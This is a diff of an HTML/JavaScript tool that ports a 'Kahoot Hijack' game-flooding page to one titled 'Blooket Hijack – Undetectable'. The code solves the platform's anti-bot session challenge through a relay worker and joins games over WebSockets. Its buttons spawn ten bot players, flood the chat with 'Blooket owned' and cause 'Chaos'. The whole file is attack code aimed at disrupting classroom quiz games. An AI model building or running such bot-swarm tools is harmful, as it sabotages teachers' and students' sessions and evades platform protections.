@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Kahoot Hijack – FINAL</title>
+<title>Blooket Hijack – Undetectable</title>
 <style>
 :root { --bg:#F2F2F7; --card:#FFF; --label:#000; --blue:#007AFF; --red:#FF3B30; --green:#34C759; --orange:#FF9500; }
 @media (prefers-color-scheme: dark) { :root { --bg:#000; --card:#1C1C1E; --label:#FFF; } }
@@ -39,10 +39,10 @@ button.orange { background:var(--orange); }
 </head>
 <body>
 <div class="app">
-<h1 style="margin-bottom:8px">Kahoot Hijack</h1>
+<h1 style="margin-bottom:8px">Blooket Hijack</h1>
 <div id="statusPill" class="pill">idle</div>
 <div class="card">
-<input id="pin" inputmode="numeric" maxlength="9" placeholder="Game PIN">
+<input id="pin" placeholder="Game ID (e.g. 123456)" maxlength="9">
 <input id="nick" maxlength="15" placeholder="Your nickname" value="venice">
 <div class="row">
 <button id="joinBtn">Join as me</button>
@@ -57,12 +57,8 @@ button.orange { background:var(--orange); }
 <h3>Players</h3>
 <div id="playerContainer"></div>
 </div>
-<div id="questionCard" class="qcard" style="display:none">
-<div id="questionText">Waiting…</div>
-<div class="answers" id="answers"></div>
-</div>
 <div class="row" style="margin-bottom:8px">
-<button id="blastBtn" class="orange">Blast</button>
+<button id="blastBtn" class="orange">Blast Chat</button>
 <button id="chaosBtn" class="orange">Chaos</button>
 </div>
 <div class="card">
@@ -72,7 +68,8 @@ button.orange { background:var(--orange); }
 </div>
 
 <script>
-const WORKER = 'https://kahoot-relay.therizzlerismetotally.workers.dev';
+// ========== YOUR WORKER URL ==========
+const WORKER = 'https://blooket-relay.therizzlerismetotally.workers.dev/'; // CHANGE THIS
 
 const logEl = document.getElementById('log');
 const statusPill = document.getElementById('statusPill');
@@ -87,33 +84,23 @@ function status(txt, kind) {
   statusPill.className = 'pill ' + (kind || '');
 }
 
-// ========== ROBUST DECODER ==========
+// ========== BLOOKET DECODER ==========
 function decodeChallenge(challengeStr) {
-  // Extract the message from decode.call(this, '...')
   const msgMatch = challengeStr.match(/decode\.call\(this\s*,\s*'([^']*)'/);
   const message = msgMatch ? msgMatch[1] : '';
   if (!message) throw new Error('No message in decode.call');
 
-  // Remove ALL whitespace, tabs, newlines from the challenge string
+  // Remove all whitespace
   const compact = challengeStr.replace(/\s+/g, '');
-  
-  // Extract offset expression: var offset = (...);
   const offsetMatch = compact.match(/var\s*offset\s*=\s*([^;]+);/);
   let offset;
   if (offsetMatch) {
-    try {
-      // Evaluate the expression – it's pure math, safe
-      offset = Function('return (' + offsetMatch[1] + ')')();
-    } catch(e) {
-      offset = 0;
-    }
+    try { offset = Function('return (' + offsetMatch[1] + ')')(); } catch(e) { offset = 0; }
   } else {
-    // Fallback: default spot from original kahoot (common)
     offset = 0;
   }
   log('Decoded offset = ' + offset);
 
-  // Apply formula: ((charCode * position) + offset) % 77 + 48
   let decoded = '';
   for (let i = 0; i < message.length; i++) {
     const c = message.charCodeAt(i);
@@ -122,13 +109,13 @@ function decodeChallenge(challengeStr) {
   return decoded;
 }
 
-async function fetchSession(pin) {
-  const url = `${WORKER}?url=${encodeURIComponent('https://kahoot.it/reserve/session/' + pin + '?_=' + Date.now())}`;
+async function fetchSession(gameId) {
+  const url = `${WORKER}?url=${encodeURIComponent('https://play.blooket.com/reserve/session/' + gameId + '?_=' + Date.now())}`;
   const res = await fetch(url, { cache: 'no-store' });
   if (!res.ok) throw new Error(`worker http ${res.status}`);
   const text = await res.text();
-  const header = res.headers.get('x-kahoot-session-token');
-  if (!header) throw new Error('no x-kahoot-session-token header');
+  const header = res.headers.get('x-blooket-session-token');
+  if (!header) throw new Error('no x-blooket-session-token header');
   let challenge;
   try { 
     const json = JSON.parse(text);
@@ -148,7 +135,7 @@ function buildToken(header, challenge) {
   return token;
 }
 
-// ========== PLAYER ==========
+// ========== PLAYER (BLOOKET PROTOCOL) ==========
 let sockets = [];
 let running = false;
 let playerListData = [];
@@ -180,9 +167,9 @@ function kickPlayer(name) {
   log(`Kicked ${name}`);
 }
 
-function connectBot(pin, name, token) {
+function connectBot(gameId, name, token) {
   return new Promise((resolve, reject) => {
-    const url = `wss://kahoot.it/cometd/${pin}/${encodeURIComponent(token)}`;
+    const url = `wss://play.blooket.com/cometd/${gameId}/${encodeURIComponent(token)}`;
     const ws = new WebSocket(url);
     let resolved = false;
     let clientId = null;
@@ -215,7 +202,7 @@ function connectBot(pin, name, token) {
           ws.send(JSON.stringify([{ channel:'/meta/subscribe', subscription:'/service/player', id:'3' }]));
           ws.send(JSON.stringify([{ channel:'/meta/connect', connectionType:'websocket', id:'4' }]));
           ws.send(JSON.stringify([{ channel:'/service/controller', id:'5', data:{
-            type:'login', gameid: pin, host:'kahoot.it', name: name,
+            type:'login', gameid: gameId, host:'play.blooket.com', name: name,
             content: JSON.stringify({
               device: { userAgent: navigator.userAgent, screen: { width: screen.width, height: screen.height } }
             })
@@ -250,16 +237,16 @@ function stopAll() {
 
 // ========== UI ==========
 document.getElementById('joinBtn').addEventListener('click', async () => {
-  const pin = document.getElementById('pin').value.trim();
+  const gameId = document.getElementById('pin').value.trim();
   const nick = document.getElementById('nick').value.trim();
-  if (!/^\d{5,9}$/.test(pin)) { log('Invalid PIN'); return; }
+  if (!/^\d{5,9}$/.test(gameId)) { log('Invalid Game ID'); return; }
   stopAll();
   running = true;
   status('connecting…');
   try {
-    const sess = await fetchSession(pin);
+    const sess = await fetchSession(gameId);
     const token = buildToken(sess.header, sess.challenge);
-    const ws = await connectBot(pin, nick, token);
+    const ws = await connectBot(gameId, nick, token);
     sockets.push(ws);
     status(`joined as ${nick}`, 'ok');
     log(`You are in!`);
@@ -270,14 +257,14 @@ document.getElementById('joinBtn').addEventListener('click', async () => {
 });
 
 document.getElementById('swarmBtn').addEventListener('click', async () => {
-  const pin = document.getElementById('pin').value.trim();
+  const gameId = document.getElementById('pin').value.trim();
   const base = document.getElementById('nick').value.trim().slice(0,8);
-  if (!/^\d{5,9}$/.test(pin)) { log('Invalid PIN'); return; }
+  if (!/^\d{5,9}$/.test(gameId)) { log('Invalid Game ID'); return; }
   stopAll();
   running = true;
   status('getting token…');
   try {
-    const sess = await fetchSession(pin);
+    const sess = await fetchSession(gameId);
     const token = buildToken(sess.header, sess.challenge);
     status('spawning 10 bots…');
     let joined = 0;
@@ -285,7 +272,7 @@ document.getElementById('swarmBtn').addEventListener('click', async () => {
       if (!running) break;
       const name = base + i;
       try {
-        const ws = await connectBot(pin, name, token);
+        const ws = await connectBot(gameId, name, token);
         sockets.push(ws);
         joined++;
         status(`${joined}/10 bots in`, 'ok');
@@ -304,11 +291,11 @@ document.getElementById('swarmBtn').addEventListener('click', async () => {
 document.getElementById('stopBtn').addEventListener('click', stopAll);
 
 document.getElementById('diagBtn').addEventListener('click', async () => {
-  const pin = document.getElementById('pin').value.trim();
-  if (!/^\d{5,9}$/.test(pin)) { log('Enter a valid PIN first'); return; }
+  const gameId = document.getElementById('pin').value.trim();
+  if (!/^\d{5,9}$/.test(gameId)) { log('Enter a valid Game ID first'); return; }
   log('Testing worker…');
   try {
-    const sess = await fetchSession(pin);
+    const sess = await fetchSession(gameId);
     log(`Worker returned header✅ and challenge✅`);
     const token = buildToken(sess.header, sess.challenge);
     log(`Token built (length ${token.length})`);
@@ -323,7 +310,7 @@ document.getElementById('blastBtn').addEventListener('click', () => {
   sockets.forEach(ws => {
     if (ws.readyState === 1) {
       ws.send(JSON.stringify([{ channel:'/service/controller', id: String(Math.random()), data:{
-        type:'message', content: JSON.stringify({ type:'message', message:'visit us' })
+        type:'message', content: JSON.stringify({ type:'message', message:'Blooket owned' })
       }}]));
     }
   });
